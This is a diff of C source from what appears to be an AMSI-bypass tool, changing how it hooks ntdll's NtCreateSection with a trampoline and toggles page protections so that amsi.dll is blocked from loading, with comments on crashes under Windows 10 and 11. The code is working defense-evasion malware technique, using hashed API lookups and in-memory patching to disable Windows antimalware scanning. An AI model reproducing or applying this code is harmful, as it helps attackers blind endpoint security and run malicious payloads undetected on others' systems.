@@ -57,21 +57,29 @@ __stdcall NTSTATUS restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK De
     myNtCreateSection ProtectPointer = NtCreate;
     DWORD oldprotect;
     SIZE_T syscallSize = (SIZE_T)24;
- 
-    // Temporarily set RWX, so that we can place the hook again.
-	((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &oldprotect);
-        
-    my_memcpy(NtCreate, originalBytes, 24); // Write the real NtCreateSection in the address of the hook
 
-    // Restore RX for execution.
-    /*SIZE_T syscallSize2 = (SIZE_T)24;
-    myNtCreateSection ProtectPointer2 = NtCreate;
-    ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer2, (PULONG)&syscallSize2, PAGE_EXECUTE_READ, &oldprotect);
-    */
-    
-    // Call the real NtCreateSection with original parameters.
-    NTSTATUS originalReturn =  NtCreate(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
-    
+    // Temporarily set RWX, so that we can place the hook again. The strange thing is, we need the EXECUTE permissions, otherwise it  will crash. 
+    // Although nothing should get executed here in that moment. I cannot explain that to myself, maybe someone reading this comment? ;-)
+    NTSTATUS returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &oldprotect);
+    if(returnValue == 0)
+    {
+        my_memcpy(NtCreate, originalBytes, 24); // Write the real NtCreateSection in the address of the hook
+    }
+    // Restore RX for execution. Restoring RX here in combination with setting back RWX in the hook function results in amsi not being blocked successfully.
+    //SIZE_T syscallSize2 = (SIZE_T)24;
+    //myNtCreateSection ProtectPointer2 = NtCreate;
+    //returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer2, (PULONG)&syscallSize2, PAGE_EXECUTE_READ, &oldprotect);
+    NTSTATUS originalReturn = 0;
+    //if (returnValue == 0)
+    //{
+
+        // Call the real NtCreateSection with original parameters.
+        originalReturn =  NtCreate(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
+    //}
+    //else
+    //{
+    //    originalReturn = 1;
+    //}
     if (hook_ntcreateSection()) //re-hook it
     {
 		return originalReturn;
@@ -297,24 +305,40 @@ BOOL hook_ntcreateSection()
     };
 
     void* hProc = (void*)getFunctionPtr(HASH_NTDLL, HASH_NTCREATESECTION);
-    uint64_t _NtProtectVirtualMemory = getFunctionPtr(HASH_NTDLL, HASH_NTPROTECTVIRTUALMEMORY);
+    //uint64_t _NtProtectVirtualMemory = getFunctionPtr(HASH_NTDLL, HASH_NTPROTECTVIRTUALMEMORY);
 
     myNtCreateSection NtCreate;
     NtCreate = (myNtCreateSection)hProc;
 
-    DWORD written;
-    SIZE_T syscallSize = (SIZE_T)24;
-    
+    //DWORD written;
+    //SIZE_T syscallSize = (SIZE_T)24;
+
     void* reference = (void*)ntCreateMySection;
-    
+
     my_memcpy(&trampoline_MyNtCreateSection[2], &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection
-    
-    my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection
 
-    ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
+    // The strange thing is, we need the EXECUTE permissions, otherwise it  will crash. We cannot use PAGE_READWRITE.
+    // Although nothing should get executed here in that moment. Maybe other ntdll.dll functions in that 4kb section? I cannot explain that to myself, maybe someone reading this comment? ;-)
+    /*NTSTATUS returnValue = *///((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &written);
+    /*if(returnValue == 0)
+    {*/
+        my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection
+    //}
 
+    // restoring RX at this point also leads to a crashing process on Win11, but on Win10 the second execution works perfectly fine. O.o
+    // So for best stability we might have to accept RWX for the NtCreateSection address.
+    //syscallSize = (SIZE_T)24;
+    //myNtCreateSection reProtect = hProc;
+    //NTSTATUS returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&reProtect, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
 
-    return TRUE;
+    /*if(returnValue == 0)
+    {*/
+        return TRUE;
+    /*}
+    else
+    {
+        return FALSE;
+    }*/
 }
 
 __stdcall void ruylopez(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
